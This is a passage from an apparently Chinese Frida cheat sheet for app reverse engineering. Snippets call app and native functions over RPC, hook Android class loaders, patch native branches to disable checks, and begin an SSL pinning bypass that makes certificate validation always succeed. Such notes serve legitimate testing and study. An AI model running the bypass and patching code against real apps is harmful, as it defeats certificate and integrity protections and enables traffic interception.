class="hljs-string">&#x27;- encrypt::&#x27;</span>].call(coreClass, data, key);<br>        <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;encryptString: &quot;</span> + encryptString);<br>        <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;--------------------&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">decrypt</span>(<span class="hljs-params">inputstr, inputkey</span>)</span>&#123;<br>        <span class="hljs-keyword">var</span> coreClass = ObjC.classes.coreClass.alloc();<br>        <span class="hljs-keyword">var</span> str = ObjC.classes.NSString.stringWithString_(inputstr);<br>        <span class="hljs-keyword">var</span> key = ObjC.classes.NSString.stringWithString_(inputkey);<br>        <span class="hljs-keyword">var</span> decryptString = coreClass[<span class="hljs-string">&#x27;- decrypt::&#x27;</span>].call(coreClass, str, key);<br>        <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;decryptString: &quot;</span> + decryptString);<br>        <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;--------------------&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">//getDeviceId();</span><br><span class="hljs-comment">//httpPost(&quot;http://www.ioshacker.net&quot;);</span><br><span class="hljs-comment">//encrypt(&quot;123&quot;, &quot;456&quot;);</span><br><span class="hljs-comment">//decrypt(&quot;123&quot;, &quot;456&quot;);</span><br><br><span class="hljs-comment">// 导出RPC函数</span><br>rpc.exports = &#123;<br>    <span class="hljs-attr">deviceid</span>: <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>        getDeviceId();<br>    &#125;,<br>    <span class="hljs-attr">httppost</span>: <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">urlstr</span>) </span>&#123;<br>        httpPost(urlstr);<br>    &#125;,<br>    <span class="hljs-attr">encrypt</span>: <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">inputstr, inputkey</span>) </span>&#123;<br>        encrypt(inputstr, inputkey);<br>    &#125;,<br>    <span class="hljs-attr">decrypt</span>: <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">inputstr, inputkey</span>) </span>&#123;<br>        decrypt(inputstr, inputkey);<br>    &#125;,<br>&#125;;<br></code></pre></td></tr></table></figure><p>接着我们再编写 python 代码，首先调用 get_usb_device().attach 附加到目标进程，附加成功会返回一个 Session 实例，然后读取 call.js 文件里的内容，这里的内容就是上面我们编写的 JS 代码，然后调用 session.create_script 创建脚本，再调用 load 加载脚本，最后调用 script.exports 获取 JS 导出的 RPC 函数，此时就可以调用 RPC 函数，代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">import</span> codecs<br><span class="hljs-keyword">import</span> frida<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>        <span class="hljs-comment">#附加到目标进程</span><br>        session = frida.get_usb_device().attach(<span class="hljs-string">u&#x27;CrackMe&#x27;</span>)<br><br>        <span class="hljs-comment">#读取JS脚本</span><br>        <span class="hljs-keyword">with</span> codecs.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./call.js&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>, <span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            source = f.read()<br><br>        script = session.create_script(source)<br>        script.load()<br><br>        rpc = script.exports<br><br>        <span class="hljs-comment">#调用导出的函数</span><br>        rpc.deviceid()<br>        rpc.httpPost(<span class="hljs-string">&quot;http://www.ioshacker.net&quot;</span>)<br>        rpc.encrypt(<span class="hljs-string">&quot;123&quot;</span>, <span class="hljs-string">&quot;456&quot;</span>)<br>        rpc.decrypt(<span class="hljs-string">&quot;123&quot;</span>, <span class="hljs-string">&quot;456&quot;</span>)<br>        session.detach()    <br></code></pre></td></tr></table></figure><p>上面我们讲到了如何将 Objective-C 方法导出给 Python 使用，那如何导出 C 函数呢？比如调用 NSHomeDirectory 这个系统提供的函数，知道它所在的模块是 Foundation，找到它的地址在 JS 脚本里就可以调用，然后在 rpc.exports 里添加一个导出函数，这样 Python 就可以调用了。代码如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getHomeDir</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">var</span> NSHomeDirectory = <span class="hljs-keyword">new</span> NativeFunction(ptr(Module.findExportByName(<span class="hljs-string">&quot;Foundation&quot;</span>, <span class="hljs-string">&quot;NSHomeDirectory&quot;</span>)), <span class="hljs-string">&#x27;pointer&#x27;</span>, []);<br>        <span class="hljs-keyword">var</span> path = <span class="hljs-keyword">new</span> ObjC.Object(NSHomeDirectory());<br>        <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;homeDir: &#x27;</span> + path);<br>&#125;<br><br><span class="hljs-comment">// 导出RPC函数</span><br>rpc.exports = &#123;<br>    <span class="hljs-comment">//......</span><br>    <span class="hljs-attr">homedir</span>: <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<br>            getHomeDir();<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="b2s-and-s2b"><a href="#b2s-and-s2b" class="headerlink" title="b2s and s2b"></a>b2s and s2b</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs js">    <span class="hljs-comment">//b2s</span><br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">b2s</span>(<span class="hljs-params">array</span>) </span>&#123;<br>        <span class="hljs-keyword">var</span> result = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; array.length; i++) &#123;<br>            result += <span class="hljs-built_in">String</span>.fromCharCode(modulus(array[i], <span class="hljs-number">256</span>));<br>        &#125;<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">modulus</span>(<span class="hljs-params">x, n</span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> ((x % n) + n) % n;<br>    &#125;<br>    <br><span class="hljs-comment">//s2b</span><br><br><span class="hljs-keyword">var</span> StringClass=Java.use(<span class="hljs-string">&quot;java.lang.String&quot;</span>);<br><span class="hljs-keyword">var</span> b2sString = b2s(<span class="hljs-string">&#x27;字节数组&#x27;</span>)<br><span class="hljs-built_in">console</span>.log(b2sString)<br><span class="hljs-keyword">var</span> jstring  = StringClass.$new(b2sString)<br><span class="hljs-keyword">var</span> jbyte  =  jstring.getBytes(<span class="hljs-string">&quot;UTF-8&quot;</span>)<br><br></code></pre></td></tr></table></figure><h2 id="插件化-hook"><a href="#插件化-hook" class="headerlink" title="插件化 hook"></a>插件化 hook</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs js">Java.perform(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">var</span> hook_class_name = <span class="hljs-string">&quot;Test&quot;</span>;<br>    Java.enumerateClassLoaders(&#123;<br>        <span class="hljs-attr">onMatch</span>: <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">loader</span>) </span>&#123;<br>            <span class="hljs-built_in">console</span>.log(loader)<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-keyword">if</span> (loader.findClass(hook_class_name)) &#123;<br>                    <span class="hljs-keyword">var</span> factory = Java.ClassFactory.get(loader)<br>                    <span class="hljs-keyword">var</span> myClass = factory.use(<span class="hljs-string">&quot;myClass&quot;</span>);<br>                       <span class="hljs-keyword">var</span> test = Java.classFactory.use(hook_class_name);<br>                        test.DexClass.overload().implementation=<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<br>                            <span class="hljs-keyword">var</span> ret = <span class="hljs-built_in">this</span>.DexClass();<br>                            <span class="hljs-built_in">console</span>.log(ret);<br>                            <span class="hljs-keyword">return</span> ret;<br>                        &#125;<br><br>                &#125;<br>            &#125; <span class="hljs-keyword">catch</span> (error)&#123;<br><br>            &#125;<br>        &#125;,<br>        <span class="hljs-attr">onComplete</span>: <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br><br>        &#125;<br>        &#125;);<br><br>&#125;);<br></code></pre></td></tr></table></figure><h2 id="创建字节数组"><a href="#创建字节数组" class="headerlink" title="创建字节数组"></a>创建字节数组</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> myArray=<span class="hljs-keyword">new</span> <span class="hljs-built_in">Array</span>(<span class="hljs-number">1024</span>);<br><span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; myArray.length; i++) &#123;<br>    myArray[i]= <span class="hljs-number">0x0</span>;<br>&#125;<br><span class="hljs-keyword">var</span> buffer = Java.array(<span class="hljs-string">&#x27;byte&#x27;</span>,myArray);<br></code></pre></td></tr></table></figure><h2 id="创建String数组"><a href="#创建String数组" class="headerlink" title="创建String数组"></a>创建String数组</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">Java.array(<span class="hljs-string">&quot;Ljava.lang.String;&quot;</span>, [<span class="hljs-string">&quot;111&quot;</span>,<span class="hljs-string">&quot;222&quot;</span>,<span class="hljs-string">&quot;333&quot;</span>]);<br></code></pre></td></tr></table></figure><h2 id="打印字节数组"><a href="#打印字节数组" class="headerlink" title="打印字节数组"></a>打印字节数组</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> size = <span class="hljs-number">100</span>;  <span class="hljs-comment">//字节数组长度</span><br><span class="hljs-keyword">var</span> bytearr=  Java.array(<span class="hljs-string">&quot;byte&quot;</span>,arg1); <span class="hljs-comment">//方便for循环</span><br><span class="hljs-keyword">var</span> content = <span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>;i&lt;size;i++)&#123;<br>    content = content + <span class="hljs-built_in">String</span>.fromCharCode(bytearr[i]);<br>&#125;<br><span class="hljs-built_in">console</span>.log(content)<br></code></pre></td></tr></table></figure><h2 id="load-dex打印对象"><a href="#load-dex打印对象" class="headerlink" title="load dex打印对象"></a>load dex打印对象</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js">Java.openClassFile(<span class="hljs-string">&quot;xxxxx.dex&quot;</span>).load();<br><span class="hljs-keyword">const</span>  gson = Java.use(<span class="hljs-string">&quot;com.xxxx.xxxx&quot;</span>);<br><span class="hljs-built_in">console</span>.log(gson.$new().toJson(xxxx));<br></code></pre></td></tr></table></figure><h2 id="打印堆栈"><a href="#打印堆栈" class="headerlink" title="打印堆栈"></a>打印堆栈</h2><ul><li><p>Android</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-built_in">console</span>.log(Java.use(<span class="hljs-string">&quot;android.util.Log&quot;</span>).getStackTraceString(Java.use(<span class="hljs-string">&quot;java.lang.Throwable&quot;</span>).$new()));<br></code></pre></td></tr></table></figure></li><li><p>IOS</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;\tBacktrace:\n\t&#x27;</span> + Thread.backtrace(<span class="hljs-built_in">this</span>.context,Backtracer.FUZZY).map(DebugSymbol.fromAddress).join(<span class="hljs-string">&#x27;\n\t&#x27;</span>)); <span class="hljs-comment">//Backtracer.ACCURATE</span><br></code></pre></td></tr></table></figure></li></ul><h2 id="SUB方法主动调用"><a href="#SUB方法主动调用" class="headerlink" title="SUB方法主动调用"></a>SUB方法主动调用</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-function"><span class="hljs-keyword">function</span>  <span class="hljs-title">hooksub</span>(<span class="hljs-params">content</span>) </span>&#123;<br><br>    <span class="hljs-keyword">var</span> offset = <span class="hljs-number">0x835</span>;  <span class="hljs-comment">//sub方法偏移</span><br>    <span class="hljs-keyword">var</span> nativeLibModule  = Process.getModuleByName(<span class="hljs-string">&quot;libnative-lib.so&quot;</span>);  <span class="hljs-comment">//获取so模块</span><br>    <span class="hljs-keyword">var</span> func_sub = nativeLibModule.base.add(offset);  <span class="hljs-comment">//获取sub方法内存地址</span><br>    <span class="hljs-keyword">var</span> arg0 = Memory.alloc(<span class="hljs-number">10</span>);   <span class="hljs-comment">//申请内存</span><br>    ptr(arg0).writeUtf8String(content);  <span class="hljs-comment">//写入自定义内容</span><br>    <span class="hljs-keyword">var</span> sub_method = <span class="hljs-keyword">new</span> NativeFunction(func_sub,<span class="hljs-string">&#x27;pointer&#x27;</span>,[<span class="hljs-string">&#x27;pointer&#x27;</span>]);  <span class="hljs-comment">//新建该方法，pointer为返回值（指针类型），[&#x27;pointer&#x27;]为入参（指针类型）</span><br>    <span class="hljs-keyword">var</span> result = sub_method(arg0)  <span class="hljs-comment">//调用该方法</span><br>    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;result&quot;</span>,hexdump(result)); <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="SO导出方法-主动调用"><a href="#SO导出方法-主动调用" class="headerlink" title="SO导出方法-主动调用"></a>SO导出方法-主动调用</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// char* cncrypt(char* data,  int num)</span><br><span class="hljs-comment">// NativeFunction(address, returnType, argTypes[, abi])</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">hookMethod</span>(<span class="hljs-params">str_data, n_num</span>) </span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">var</span> soName = <span class="hljs-string">&quot;libnative-lib.so&quot;</span>;    <span class="hljs-comment">//要hook的so名</span><br>    <span class="hljs-keyword">var</span> funcName = <span class="hljs-string">&quot;encrypt&quot;</span>;          <span class="hljs-comment">//要hook的函数名</span><br>    <br>    <span class="hljs-comment">//获取函数的地址</span><br>    <span class="hljs-keyword">var</span> n_addr_func = Module.findExportByName(soName , funcName);<br>    <br><br>    <span class="hljs-keyword">var</span> func_c_enc = <span class="hljs-keyword">new</span> NativeFunction(n_addr_func , <span class="hljs-string">&#x27;pointer&#x27;</span>, [<span class="hljs-string">&#x27;pointer&#x27;</span>, <span class="hljs-string">&#x27;int&#x27;</span>]);<br>    <br>    <span class="hljs-comment">//调用frida的api申请空间 填入字符串</span><br>    <span class="hljs-keyword">var</span> str_data_arg = Memory.allocUtf8String(str_data);<br>    <br>     <span class="hljs-comment">//调用so层的c函数</span><br>    <span class="hljs-keyword">var</span> p_str_ret = func_c_enc(str_data_arg, n_num);<br>    <br>    <span class="hljs-comment">//读取字符串  </span><br>    <span class="hljs-keyword">var</span> str_ret = Memory.readCString(p_str_ret);<br>    <span class="hljs-keyword">return</span> str_ret;<br>&#125;<br></code></pre></td></tr></table></figure><p>NativeFunction中frida支持的数据类型和abi</p><h3 id="SUPPORTED-TYPES"><a href="#SUPPORTED-TYPES" class="headerlink" title="SUPPORTED TYPES"></a>SUPPORTED TYPES</h3><ul><li>void</li><li>pointer</li><li>int</li><li>uint</li><li>long</li><li>ulong</li><li>char</li><li>uchar</li><li>size_t</li><li>ssize_t</li><li>float</li><li>double</li><li>int8</li><li>uint8</li><li>int16</li><li>uint16</li><li>int32</li><li>uint32</li><li>int64</li><li>uint64</li><li>bool</li></ul><h3 id="SUPPORTED-ABIS"><a href="#SUPPORTED-ABIS" class="headerlink" title="SUPPORTED ABIS"></a>SUPPORTED ABIS</h3><ul><li>default</li><li>Windows 32-bit:<ul><li>sysv</li><li>stdcall</li><li>thiscall</li><li>fastcall</li><li>mscdecl</li></ul></li><li>Windows 64-bit:<ul><li>win64</li></ul></li><li>UNIX x86:<ul><li>sysv</li><li>unix64</li></ul></li><li>UNIX ARM:<ul><li>sysv</li><li>vfp</li></ul></li></ul><h2 id="keypatch"><a href="#keypatch" class="headerlink" title="keypatch"></a>keypatch</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">dis</span>(<span class="hljs-params">address,number</span>) </span>&#123;<br>    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;\n&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; number; i++) &#123;<br>        <span class="hljs-keyword">var</span> ins = Instruction.parse(address);<br>        <span class="hljs-built_in">console</span>.error(<span class="hljs-string">&quot;address:&quot;</span> + address + <span class="hljs-string">&quot; dis:&quot;</span> + ins.toString());<br>        address = ins.next;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">nopKill</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-comment">//nop kill</span><br>    <span class="hljs-keyword">var</span> libnativemodule = Process.getModuleByName(<span class="hljs-string">&quot;libnative-lib.so&quot;</span>);<br>    <span class="hljs-keyword">var</span> base = libnativemodule.base;<br>    Memory.patchCode(base.add(<span class="hljs-number">0x1564</span>),<span class="hljs-number">4</span>,<span class="hljs-function"><span class="hljs-params">patchaddr</span> =&gt;</span>&#123;<br>       <span class="hljs-keyword">var</span>  arm64Writer =   <span class="hljs-keyword">new</span> Arm64Writer(patchaddr);<br>       arm64Writer.putNop();<br>       arm64Writer.flush();<br>    &#125;)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">editTbnz</span>(<span class="hljs-params"></span>) </span>&#123;<br><br>     <span class="hljs-comment">// Tbnz =&gt; Tbz</span><br>     <span class="hljs-keyword">var</span> libnativemodule = Process.getModuleByName(<span class="hljs-string">&quot;libnative-lib.so&quot;</span>);<br>     <span class="hljs-keyword">var</span> base = libnativemodule.base;<br>     Memory.protect(base.add(<span class="hljs-number">0x150C</span>), <span class="hljs-number">4</span>, <span class="hljs-string">&#x27;rwx&#x27;</span>);<br>     base.add(<span class="hljs-number">0x150C</span>).writeByteArray([<span class="hljs-number">0xD1</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x36</span>]);<br><br><br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">main</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-comment">// hook();</span><br>    <span class="hljs-keyword">var</span> libnativemodule = Process.getModuleByName(<span class="hljs-string">&quot;libnative-lib.so&quot;</span>);<br>    <span class="hljs-keyword">var</span> base = libnativemodule.base;<br>    dis(base.add(<span class="hljs-number">0x150C</span>),<span class="hljs-number">30</span>);<br>    <span class="hljs-comment">//nopKill();</span><br>    <span class="hljs-comment">//editTbnz();</span><br>&#125;<br><br>setImmediate(main);<br></code></pre></td></tr></table></figure><h2 id="ssl-pinning"><a href="#ssl-pinning" class="headerlink" title="ssl_pinning"></a>ssl_pinning</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><code class="hljs js">Java.perform(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">var</span> androidVersion = <span class="hljs-built_in">parseInt</span>(Java.androidVersion, <span class="hljs-number">10</span>) <br>    <span class="hljs-keyword">if</span> (androidVersion &gt; <span class="hljs-number">6</span>)&#123;<br>        <span class="hljs-built_in">console</span>.log(<span class="hljs-number">111</span>)<br>        <span class="hljs-keyword">try</span>&#123;<br>            <span class="hljs-comment">// Generic SSL Pinning Bypass tested on Android 7, 7.1, 8, and 9</span><br>            <span class="hljs-comment">// https://android.googlesource.com/platform/external/conscrypt/+/1186465/src/platform/java/org/conscrypt/TrustManagerImpl.java#391</span><br>            <span class="hljs-keyword">var</span> TrustManagerImpl = Java.use(<span class="hljs-string">&#x27;com.android.org.conscrypt.TrustManagerImpl&#x27;</span>);<br>            TrustManagerImpl.checkTrustedRecursive.implementation = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">certs, host, clientAuth, untrustedChain, trustedChain, used</span>) </span>&#123;<br>                send(<span class="hljs-string">&#x27;[SSL Pinning Bypass] checkTrustedRecursive() bypassed&#x27;</span>);<br>                <span class="hljs-keyword">return</span> Java.use(<span class="hljs-string">&quot;java.util.ArrayList&quot;</span>).$new();<br>            &#125;<br>        &#125;<span class="hljs-keyword">catch</span> (err) &#123;<br>            send(<span class="hljs-string">&#x27;[SSL Pinning Bypass] TrustManagerImpl.checkTrustedRecursive() not found&#x27;</span>);<br>        &#125;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">var</span> TrustManagerImpl2 = Java.use(<span class="hljs-string">&#x27;com.android.org.conscrypt.TrustManagerImpl&#x27;</span>);<br>            TrustManagerImpl2.verifyChain.implementation = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">untrustedChain, trustAnchorChain, host, clientAuth, ocspData, tlsSctData</span>) </span>&#123;<br>                send(<span class="hljs-string">&#x27;[SSL Pinning Bypass] verifyChain() bypassed for: &#x27;</span> + host);<br>                <span class="hljs-keyword">return</span> untrustedChain;<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (err) &#123;<br>            send(<span class="hljs-string">&#x27;[SSL Pinning Bypass] TrustManagerImpl.verifyChain() not found&#x27;</span>);<br>        &#125;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">var</span> ConscryptFileDescriptorSocket = Java.use(<span class="hljs-string">&#x27;com.android.org.conscrypt.ConscryptFileDescriptorSocket&#x27;</span>);<br>            ConscryptFileDescriptorSocket.verifyCertificateChain.implementation = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">certChain, authMethod</span>) </span>&#123;<br>                send(<span class="hljs-string">&#x27;[SSL Pinning Bypass] verifyCertificateChain() bypassed&#x27;</span>);<br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (err) &#123;<br>            send(<span class="hljs-string">&#x27;[SSL Pinning Bypass] ConscryptFileDescriptorSocket.verifyCertificateChain() not found&#x27;</span>);<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (androidVersion &gt; <span class="hljs-number">4</span> &amp;&amp; androidVersion &lt; <span class="hljs-number">7</span>) &#123;<br>         <span 